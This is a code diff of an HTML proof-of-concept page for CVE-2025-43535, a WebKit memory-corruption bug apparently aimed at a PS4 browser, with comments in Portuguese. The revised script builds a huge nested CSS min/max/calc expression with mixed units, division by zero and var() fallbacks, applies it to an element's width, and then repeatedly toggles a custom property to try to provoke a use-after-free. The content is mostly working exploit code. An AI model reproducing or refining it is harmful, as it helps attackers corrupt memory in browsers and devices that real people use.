@@ -1,9 +1,8 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43535 PoC — V1 Otimizada</title>
+<title>CVE-2025-43535 PoC — Poisoned Math</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px;
@@ -12,7 +11,7 @@
 </style>
 </head>
 <body>
-<h3>CVE-2025-43535 — Memory Corruption (V1 Max RAM)</h3>
+<h3>CVE-2025-43535 — Memory Corruption (Poisoned AST)</h3>
 <div id="log"></div>
 
 <script>
@@ -23,11 +22,10 @@ const L=(m,c)=>{const d=document.getElementById('log');
   d.scrollTop=d.scrollHeight;
 };
 
-// Pausa de 300ms para garantir que o GC destruiu as strings no JS
-const yieldGC = () => new Promise(r => setTimeout(r, 300));
+const yieldGC = () => new Promise(r => setTimeout(r, 200));
 
-async function variant1_css_math_optimized() {
-  L("[V1] Iniciando gerador matemático hiper-minificado...");
+async function variant1_poisoned_math() {
+  L("[V1] Iniciando gerador matemático venenoso (Type Confusion)...");
 
   const el = document.createElement('div');
   el.style.cssText = 'position:absolute;top:-9999px';
@@ -35,70 +33,74 @@ async function variant1_css_math_optimized() {
 
   let mathCache = {};
 
-  // Função Original, mas gerando a menor string possível em bytes
-  function makeMathNested(depth) {
-    if (depth <= 0) return '1px'; // 1px economiza bytes valiosos em relação a 10px
+  // Função que gera complexidade e conflito de tipos, não apenas tamanho
+  function makePoisonedMath(depth) {
+    if (depth <= 0) {
+      // Injetando unidades diferentes e var() com fallback obscuro
+      const bases = ['1px', '1vw', 'calc(1px/0)', 'var(--x, 1em)'];
+      return bases[Math.floor(Math.random() * bases.length)];
+    }
+    
     if (mathCache[depth]) return mathCache[depth];
 
-    // Alterna apenas entre min e max. Sem 'clamp' para evitar o 3º argumento que explode a RAM.
     const f = depth % 2 === 0 ? 'min' : 'max';
     
-    // Sem espaços, o mais compacto possível
-    const result = `${f}(${makeMathNested(depth-1)},${makeMathNested(depth-1)})`;
+    // A cada 5 níveis, injetamos uma operação matemática ilegal ou complexa 
+    // para forçar o WebKit a descartar e recalcular nós (gerando churn no C++)
+    let result = '';
+    if (depth % 5 === 0) {
+       result = `calc(${f}(${makePoisonedMath(depth-1)}, ${makePoisonedMath(depth-1)}) + 1%)`;
+    } else {
+       result = `${f}(${makePoisonedMath(depth-1)}, ${makePoisonedMath(depth-1)})`;
+    }
     
     mathCache[depth] = result;
     return result;
   }
 
-  // Com a otimização de bytes, o PS4 deve passar do 26 com folga.
-  const niveisParaTestar = [26, 27, 28];
+  // Nível 24 é seguro e nunca vai dar RangeError de string
+  const nivelSeguro = 24;
 
-  for (const d of niveisParaTestar) {
-    L(`[V1] Gerando string para nível ${d}...`);
+  L(`[V1] Gerando payload com Nível ${nivelSeguro}...`);
+  try {
+    let payload = makePoisonedMath(nivelSeguro);
+    L(`[V1] Payload gerado. Tamanho: ${(payload.length / 1024 / 1024).toFixed(2)} MB`);
     
-    try {
-      let payload = makeMathNested(d);
-      
-      L(`[V1] String gerada. Aplicando no DOM...`);
-      el.style.width = payload;
+    // Configura a variável CSS usada como fallback na base
+    el.style.setProperty('--x', '0px');
+    
+    L(`[V1] Aplicando no DOM e forçando cálculo de tipos...`);
+    el.style.width = payload;
+    
+    // Libera a string gigante do JS
+    payload = null;
+    mathCache = null;
+    await yieldGC();
 
-      // ==========================================
-      // TRUQUE DE MESTRE: LIBERAÇÃO DE RAM PRÉ-LAYOUT
-      // ==========================================
-      L(`[V1] Deletando string do JS para liberar RAM pro WebKit C++...`);
-      payload = null; 
-      
-      // Se for o último nível, apaga até o cache para dar 100% da RAM pro C++
-      if (d === niveisParaTestar[niveisParaTestar.length - 1]) {
-        mathCache = null; 
-      }
-
-      // Aguarda o Garbage Collector do JavaScript agir
-      await yieldGC(); 
-
-      L(`[V1] Disparando Style Resolver (A hora da verdade)...`);
-      await new Promise(r => requestAnimationFrame(r));
-      
-      // Força o C++ a processar a árvore CSSOM que ficou na memória
-      void el.offsetWidth;
-      
-      L(`[V1] Nível ${d} sobreviveu!`, "ok");
-    } catch(e) {
-      L(`[V1] Erro no nível ${d}: ${e}`, "fail");
+    // O C++ vai tentar resolver a divisão por zero, os % misturados com vw, 
+    // tudo no meio de uma árvore de milhões de nós.
+    void el.offsetWidth;
+    
+    L(`[V1] Sobreviveu ao primeiro impacto. Alternando variáveis para causar Use-After-Free...`);
+    
+    // Se o bug for de lifecycle, alterar a variável customizada vai forçar o 
+    // C++ a reavaliar toda a árvore usando ponteiros que podem já ter sido liberados.
+    for(let i = 0; i < 50; i++) {
+        el.style.setProperty('--x', i % 2 === 0 ? '10px' : 'calc(1px / 0)');
+        void el.offsetWidth;
     }
 
-    // Limpeza para o próximo loop
-    el.style.width = '10px';
-    await yieldGC();
+    L(`[V1] Teste finalizado limpo!`, "ok");
+  } catch(e) {
+    L(`[V1] Erro na execução: ${e}`, "fail");
   }
 
   document.body.removeChild(el);
-  L("[V1] Teste da Variante 1 concluído.", "ok");
 }
 
 async function main() {
   try {
-    await variant1_css_math_optimized();
+    await variant1_poisoned_math();
     L("=== FIM DA EXECUÇÃO ===", "ok");
   } catch(e) {
     L("EXCEÇÃO FATAL: " + e.toString(), "fail");
